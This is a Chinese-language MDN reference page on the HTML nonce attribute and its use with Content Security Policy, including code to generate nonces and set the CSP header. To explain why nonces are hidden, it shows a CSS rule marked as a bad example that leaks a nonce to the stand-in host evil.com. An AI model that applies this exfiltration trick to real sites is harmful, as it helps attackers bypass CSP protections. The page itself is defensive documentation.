---
title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
l10n:
  sourceCommit: ba96f2f183353872db6d9242c7d2dffe2dbc0c35
---

**`nonce`** [全局属性](/zh-CN/docs/Web/HTML/Reference/Global_attributes)是定义了密码学 nonce（“只使用一次的数字”）的内容属性，[内容安全策略](/zh-CN/docs/Web/HTTP/Guides/CSP)可以使用它来确定是否允许对给定元素进行获取。

## 描述

`nonce` 属性可用于允许对特定资源的获取，如内联脚本或样式元素。它可以帮助你避免使用 [CSP](/zh-CN/docs/Web/HTTP/Guides/CSP) `unsafe-inline` 指令，该指令会允许你获取*所有*的内联脚本或样式资源。

> [!NOTE]
> 只有在无法避免使用不安全的内联脚本或样式内容时，才使用 `nonce`。如果不需要 `nonce`，就不要使用。如果脚本是静态的，也可以使用 CSP 散列值来代替。（请参阅[不安全内联脚本](/zh-CN/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#不安全内联脚本)中的使用说明）。始终尽量充分利用 [CSP](/zh-CN/docs/Web/HTTP/Guides/CSP) 保护，并尽可能避免使用 nonce 或不安全的内联脚本。

### 使用 nonce 以允许一个 \<script> 元素

使用 nonce 机制允许内联脚本需要几个步骤：

#### 生成所需值

从你的 web 服务器上，使用一个密码学安全的随机数生成器生成至少 128 位的 base64 编码的随机字符串。每次加载页面时，应该以不同的方式生成 nonce（nonce 只能生成一次！）。例如，在 nodejs 中，应该这样做：

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### 在内联脚本中允许获取资源

后端代码生成的 nonce 现在应该可用于你希望允许使用的内联脚本：

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### 发送带有 CSP 标头的 nonce

最后，你需要在 [`Content-Security-Policy`](/zh-CN/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) 标头中发送 nonce 值（需要在此值前面附加 `nonce-`）：

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### 访问 nonce 值和 nonce 隐藏

出于安全考虑，`nonce` 内容属性是隐藏的（将返回空字符串）。

```js example-bad
script.getAttribute("nonce"); // 返回空字符串
```

[`nonce`](/zh-CN/docs/Web/API/HTMLElement/nonce) 属性是访问 nonce 的唯一方法：

```js example-good
script.nonce; // 返回 nonce 值
```

Nonce 隐藏有助于防止攻击者通过能从内容属性中抓取数据的机制泄露 nonce 数据，比如这样：

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## 规范

{{Specifications}}

## 浏览器兼容性

{{Compat}}

## 参见

- [`HTMLElement.nonce`](/zh-CN/docs/Web/API/HTMLElement/nonce)
- [内容安全策略](/zh-CN/docs/Web/HTTP/Guides/CSP)
- CSP：[`script-src`](/zh-CN/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
